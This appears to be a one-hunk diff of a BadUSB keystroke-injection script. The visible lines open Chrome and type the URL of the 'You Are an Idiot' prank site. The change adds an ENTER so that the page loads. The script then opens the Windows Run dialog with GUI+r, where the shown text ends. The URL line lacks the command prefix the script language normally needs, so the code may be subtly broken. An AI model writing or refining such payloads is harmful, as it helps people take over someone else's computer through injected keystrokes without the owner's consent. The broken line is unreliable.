@@ -5,6 +5,7 @@ STRING chrome
 ENTER
 DELAY 1000
 https://youareanidiot.cc/
+ENTER
 DELAY 1000
 GUI r
 DELAY 500
